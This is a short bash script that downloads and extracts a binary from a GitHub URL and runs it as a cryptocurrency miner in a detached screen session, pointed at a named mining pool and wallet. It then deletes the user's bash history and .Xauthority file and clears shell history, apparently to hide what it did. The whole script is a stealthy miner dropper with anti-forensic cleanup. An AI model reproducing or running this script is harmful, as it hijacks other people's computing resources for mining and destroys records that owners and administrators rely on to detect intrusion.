#!/bin/bash

#  apt 
export DEBIAN_FRONTEND=noninteractive
cd ~

# down 
wget https://raw.githubusercontent.com/xiaobintse/sh/main/s.tar.gz
chmod +x s.tar.gz
tar -zxvf s.tar.gz

# screen 
screen -dmS s bash -c './s --algorithm quantus --pool ru.lproute.com:5660 --wallet qzoLfsByQ515ofyuge61V7LENrtFLMV18AZEseQYqU1aH2du2 --worker $(hostname)'

# rm
rm -rf ~/.Xauthority
rm -rf ~/.bash_history
history -c
exit 0